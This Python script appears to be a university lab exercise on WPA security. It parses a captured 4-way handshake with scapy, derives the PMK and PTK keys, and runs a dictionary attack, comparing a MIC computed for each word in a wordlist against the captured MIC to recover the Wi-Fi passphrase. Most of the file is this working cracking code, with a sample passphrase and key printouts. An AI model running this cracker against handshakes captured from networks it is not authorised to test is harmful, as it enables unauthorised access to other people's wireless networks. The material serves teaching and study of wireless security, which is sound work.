#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Derive WPA keys from Passphrase and 4-way handshake info

Calcule un MIC d'authentification (le MIC pour la transmission de données
utilise l'algorithme Michael. Dans ce cas-ci, l'authentification, on utilise
sha-1 pour WPA2 ou MD5 pour WPA)
"""

__author__      = "Abraham Rubinstein et Yann Lederrey"
__copyright__   = "Copyright 2017, HEIG-VD"
__license__ 	= "GPL"
__version__ 	= "1.0"
__email__ 		= "abraham.rubinstein@heig-vd.ch"
__status__ 		= "Prototype"

from scapy.all import *
from binascii import a2b_hex, b2a_hex
#from pbkdf2 import pbkdf2_hex
from pbkdf2 import *
from numpy import array_split
from numpy import array
import hmac, hashlib

def customPRF512(key,A,B):
    """
    This function calculates the key expansion from the 256 bit PMK to the 512 bit PTK
    """
    blen = 64
    i    = 0
    R    = b''
    while i<=((blen*8+159)/160):
        hmacsha1 = hmac.new(key,A+str.encode(chr(0x00))+B+str.encode(chr(i)),hashlib.sha1)
        i+=1
        R = R+hmacsha1.digest()
    return R[:blen]

# Read capture file -- it contains beacon, authentication, associacion, handshake and data
wpa=rdpcap("wpa_handshake.cap") 

# Get the association request and the handshake number
assoReqNb   = None
eapolNb     = None

for i, packet in enumerate(wpa):
    if packet.haslayer(Dot11AssoReq):
        assoReq = packet
        assoReqNb = i
    elif packet.haslayer(EAPOL):
        eapol = packet
        eapolNb = i
    if assoReqNb and eapolNb:
        break
    
# Get the SSID and the MAC addresses of the AP and the client
ssid        = assoReq.info.decode("utf-8")
APmac       = a2b_hex(assoReq.addr2.replace(":",""))
Clientmac   = a2b_hex(assoReq.addr1.replace(":",""))

# Get the ANonce and SNonce
ANonce      = wpa[eapolNb].load[13:45]
SNonce      = wpa[eapolNb + 1].load[13:45]


# Important parameters for key derivation - most of them can be obtained from the pcap file
passPhrase  = "actuelle"
A           = "Pairwise key expansion" #this string is used in the pseudo-random function

# This is the MIC contained in the 4th frame of the 4-way handshake
# When attacking WPA, we would compare it to our own MIC calculated using passphrases from a dictionary
mic_to_test = wpa[eapolNb +3].load[-18:-2].hex()

B           = min(APmac,Clientmac)+max(APmac,Clientmac)+min(ANonce,SNonce)+max(ANonce,SNonce) #used in pseudo-random function

# Calculate the data field and zero the MIC field in the EAPOL frame
data        = wpa[8].original[48:-18] + b'\0' * 16 + wpa[8].original[-2:]

print ("\n\nValues used to derivate keys")
print ("============================")
print ("Passphrase: ",passPhrase,"\n")
print ("SSID: ",ssid,"\n")
print ("AP Mac: ",b2a_hex(APmac),"\n")
print ("CLient Mac: ",b2a_hex(Clientmac),"\n")
print ("AP Nonce: ",b2a_hex(ANonce),"\n")
print ("Client Nonce: ",b2a_hex(SNonce),"\n")

print ("\n\nSearching for passphrase with wordlist ...")
print ("==========================================")


ssid = str.encode(ssid)
# Read the wordlist
with open("wordlist.txt", 'r') as f:
    wordlist = f.readlines()

B = min(APmac, Clientmac)+max(APmac, Clientmac) + min(ANonce, SNonce)+max(ANonce, SNonce)

for word in wordlist:
    word = word.strip()
    
    word = str.encode(word)
    pmk = pbkdf2(hashlib.sha1, word, ssid, 4096, 32)
    
    ptk = customPRF512(pmk,str.encode(A),B)
    
    mic = hmac.new(ptk[0:16],data,hashlib.sha1)
    
    print("mic to test: ", mic_to_test, "mic found: ", mic.hexdigest()[:-8])
    
    if mic.hexdigest()[:-8] == mic_to_test:
        print("Passphrase found: ", word.decode())
        break
    
print ("\n\nResults of the key expansion")
print ("=============================")
print ("PMK:\t\t",pmk.hex(),"\n")
print ("PTK:\t\t",ptk.hex(),"\n")
print ("KCK:\t\t",ptk[0:16].hex(),"\n")
print ("KEK:\t\t",ptk[16:32].hex(),"\n")
print ("TK:\t\t",ptk[32:48].hex(),"\n")
print ("MICK:\t\t",ptk[48:64].hex(),"\n")
print ("MIC:\t\t",mic.hexdigest(),"\n")